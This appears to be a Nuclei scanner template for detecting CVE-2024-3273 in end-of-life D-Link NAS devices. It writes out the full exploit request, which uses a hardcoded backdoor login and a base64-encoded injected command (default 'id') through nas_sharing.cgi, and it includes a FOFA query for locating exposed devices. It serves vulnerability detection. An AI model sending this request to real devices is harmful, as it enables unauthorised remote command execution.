http:
- matchers:
  - type: word
    words:
    - <auth_state>1</auth_state>
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system={{base64(cmd)}}'
id: CVE-2024-3273
info:
  author: pussycat0x
  classification:
    cve-id: CVE-2024-3273
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cwe-id: CWE-77
    epss-percentile: 0.09057
    epss-score: 0.00044
  description: 'UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified
    as critical, was found in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to
    20240403. Affected is an unknown function of the file /cgi-bin/nas_sharing.cgi
    of the component HTTP GET Request Handler. The manipulation of the argument system
    leads to command injection. It is possible to launch the attack remotely. The
    exploit has been disclosed to the public and may be used. The identifier of this
    vulnerability is VDB-259284. NOTE: This vulnerability only affects products that
    are no longer supported by the maintainer. NOTE: Vendor was contacted early and
    confirmed immediately that the product is end-of-life. It should be retired and
    replaced.

    '
  metadata:
    fofa-query: app="D_Link-DNS-ShareCenter"
    verified: true
  name: D-Link Network Attached Storage - Command Injection and Backdoor Account
  reference:
  - https://github.com/netsecfish/dlink
  - https://www.bleepingcomputer.com/news/security/over-92-000-exposed-d-link-nas-devices-have-a-backdoor-account/#google_vignette
  - https://news.ycombinator.com/item?id=39960107
  - https://supportannouncement.us.dlink.com/security/publication.aspx?name=SAP10383
  - https://vuldb.com/?ctiid.259284
  severity: high
  tags: cve,cve2024,dlink,nas
variables:
  cmd: id
